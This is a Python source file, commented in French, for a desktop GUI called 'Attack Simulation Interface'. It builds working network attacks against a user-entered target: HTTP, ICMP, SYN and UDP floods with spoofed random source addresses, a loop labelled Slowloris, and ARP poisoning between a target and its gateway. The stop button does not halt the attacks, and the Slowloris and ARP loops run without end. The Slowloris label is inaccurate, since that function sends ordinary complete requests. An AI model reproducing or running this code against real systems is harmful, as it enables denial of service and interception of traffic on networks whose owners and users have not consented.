import tkinter as tk
from tkinter import messagebox
import customtkinter as ctk
import threading  # Importation de threading pour exécuter l'attaque dans un thread séparé
import requests  # Pour l'attaque HTTP Flood
from scapy.all import IP, ICMP, TCP, UDP, send, ARP, srp, Ether
import random
import time
import socket

# Fonction pour HTTP Flood Attack (corrigée)
def http_flood(target_ip, target_port, count, log_display):
    http_request = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n"
    for _ in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))  # Connexion au serveur
            sock.send(http_request.encode())  # Envoie la requête HTTP
            log_display.insert(tk.END, f"HTTP Flood request sent to {target_ip}:{target_port}\n")
            sock.close()
        except Exception as e:
            log_display.insert(tk.END, f"Error during HTTP Flood: {e}\n")

# Fonction pour ICMP Flood Attack
def icmp_flood_attack(target_ip, packet_count, log_display):
    for _ in range(packet_count):
        ip_layer = IP(src=".".join(map(str, (random.randint(0, 255) for _ in range(4)))), dst=target_ip)
        icmp_layer = ICMP()
        payload = b"X" * random.randint(10, 50)  # Random payload size
        packet = ip_layer / icmp_layer / payload
        send(packet, verbose=0)
        log_display.insert(tk.END, f"ICMP packet sent to {target_ip}\n")

# Fonction pour SYN Flood Attack
def syn_flood_attack(target_ip, target_port, packet_count, log_display):
    for _ in range(packet_count):
        ip_layer = IP(src=".".join(map(str, (random.randint(0, 255) for _ in range(4)))), dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)
        log_display.insert(tk.END, f"SYN packet sent to {target_ip}:{target_port}\n")

# Fonction pour UDP Flood Attack
def udp_flood_attack(target_ip, target_port, packet_count, log_display):
    for _ in range(packet_count):
        ip_layer = IP(src=".".join(map(str, (random.randint(0, 255) for _ in range(4)))), dst=target_ip)
        udp_layer = UDP(sport=random.randint(1024, 65535), dport=target_port)
        payload = b"X" * random.randint(10, 50)  # Random payload size
        packet = ip_layer / udp_layer / payload
        send(packet, verbose=0)
        log_display.insert(tk.END, f"UDP packet sent to {target_ip}:{target_port}\n")

# Fonction pour Anonymous Attack (Slowloris)
def slowloris_attack(target_ip, target_port, log_display):
    url = f"http://{target_ip}:{target_port}"  # Construire l'URL cible
    while True:
        try:
            # Envoi d'un entête HTTP incomplet pour garder la connexion ouverte
            headers = {'Connection': 'keep-alive'}
            response = requests.get(url, headers=headers, timeout=2)
            log_display.insert(tk.END, f"Slowloris attack sent to {url}\n")
        except requests.exceptions.RequestException as e:
            log_display.insert(tk.END, f"Error occurred: {e}\n")
        time.sleep(0.1)

# Fonction pour ARP Poisoning Attack
def arp_poisoning_attack(target_ip, gateway_ip, log_display):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if target_mac is None or gateway_mac is None:
        log_display.insert(tk.END, "MAC address not found for ARP Poisoning.\n")
        return

    arp_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    arp_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    while True:
        send(arp_target, verbose=0)
        send(arp_gateway, verbose=0)
        log_display.insert(tk.END, f"ARP poisoning packets sent to {target_ip} and {gateway_ip}\n")
        time.sleep(2)

# Fonction pour obtenir l'adresse MAC d'une cible IP
def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
        for _, rcv in ans:
            return rcv[ARP].hwsrc
    except Exception as e:
        print(f"Error getting MAC for {ip}: {e}")
        return None

# Fonction pour démarrer l'attaque dans un thread séparé
def start_attack_thread():
    attack_type = attack_menu.get()
    ip = ip_entry.get()
    port = port_entry.get()
    packets = packets_entry.get()

    try:
        packet_count = int(packets)
    except ValueError:
        messagebox.showerror("Error", "Number of packets must be an integer")
        return

    if attack_type == "HTTP Flood":
        log_display.insert(tk.END, f"Starting HTTP Flood attack on {ip}:{port} with {packet_count} packets...\n")
        threading.Thread(target=http_flood, args=(ip, int(port), packet_count, log_display)).start()
    elif attack_type == "ICMP Flood":
        log_display.insert(tk.END, f"Starting ICMP Flood attack on {ip} with {packet_count} packets...\n")
        threading.Thread(target=icmp_flood_attack, args=(ip, packet_count, log_display)).start()
    elif attack_type == "SYN Flood":
        log_display.insert(tk.END, f"Starting SYN Flood attack on {ip}:{port} with {packet_count} packets...\n")
        threading.Thread(target=syn_flood_attack, args=(ip, int(port), packet_count, log_display)).start()
    elif attack_type == "UDP Flood":
        log_display.insert(tk.END, f"Starting UDP Flood attack on {ip}:{port} with {packet_count} packets...\n")
        threading.Thread(target=udp_flood_attack, args=(ip, int(port), packet_count, log_display)).start()
    elif attack_type == "Anonymous (Slowloris)":
        log_display.insert(tk.END, f"Starting Anonymous (Slowloris) attack on {ip}:{port}...\n")
        threading.Thread(target=slowloris_attack, args=(ip, int(port), log_display)).start()
    elif attack_type == "ARP Poisoning":
        gateway_ip = gateway_entry.get()
        log_display.insert(tk.END, f"Starting ARP Poisoning attack on {ip} and gateway {gateway_ip}...\n")
        threading.Thread(target=arp_poisoning_attack, args=(ip, gateway_ip, log_display)).start()
    else:
        messagebox.showerror("Error", "Invalid attack type selected")
        return

    messagebox.showinfo("Information", f"{attack_type} attack started on {ip}:{port}")

# Fonction pour arrêter l'attaque
def stop_attack():
    log_display.insert(tk.END, "Attack stopped.\n")
    # Ajouter la logique pour arrêter l'attaque ici si nécessaire

# Création de la fenêtre principale
app = ctk.CTk()
app.title("Attack Simulation Interface")
app.geometry("600x600")

# Menu pour sélectionner le type d'attaque
attack_label = ctk.CTkLabel(app, text="Select Attack Type:")
attack_label.pack(pady=10)

attack_types = ["HTTP Flood", "ICMP Flood", "SYN Flood", "UDP Flood", "Anonymous (Slowloris)", "ARP Poisoning"]
attack_menu = ctk.CTkComboBox(app, values=attack_types)
attack_menu.pack(pady=10)

# Champs de configuration (IP, port, packets, gateway)
config_frame = ctk.CTkFrame(app)
config_frame.pack(pady=10, padx=20)

ip_label = ctk.CTkLabel(config_frame, text="Target IP:")
ip_label.grid(row=0, column=0, padx=5, pady=5)
ip_entry = ctk.CTkEntry(config_frame)
ip_entry.grid(row=0, column=1, padx=5, pady=5)

port_label = ctk.CTkLabel(config_frame, text="Target Port:")
port_label.grid(row=1, column=0, padx=5, pady=5)
port_entry = ctk.CTkEntry(config_frame)
port_entry.grid(row=1, column=1, padx=5, pady=5)

packets_label = ctk.CTkLabel(config_frame, text="Number of Packets:")
packets_label.grid(row=2, column=0, padx=5, pady=5)
packets_entry = ctk.CTkEntry(config_frame)
packets_entry.grid(row=2, column=1, padx=5, pady=5)

gateway_label = ctk.CTkLabel(config_frame, text="Gateway IP (for ARP Poisoning):")
gateway_label.grid(row=3, column=0, padx=5, pady=5)
gateway_entry = ctk.CTkEntry(config_frame)
gateway_entry.grid(row=3, column=1, padx=5, pady=5)

# Boutons pour démarrer et arrêter l'attaque
button_frame = ctk.CTkFrame(app)
button_frame.pack(pady=10)

start_button = ctk.CTkButton(button_frame, text="Start Attack", command=start_attack_thread)  # Appel de la fonction avec threading
start_button.pack(side=tk.LEFT, padx=10)

stop_button = ctk.CTkButton(button_frame, text="Stop Attack", command=stop_attack)
stop_button.pack(side=tk.LEFT, padx=10)

# Zone de log pour afficher les messages
log_display = tk.Text(app, height=10, width=50)
log_display.pack(pady=10)

# Lancer l'application
app.mainloop()

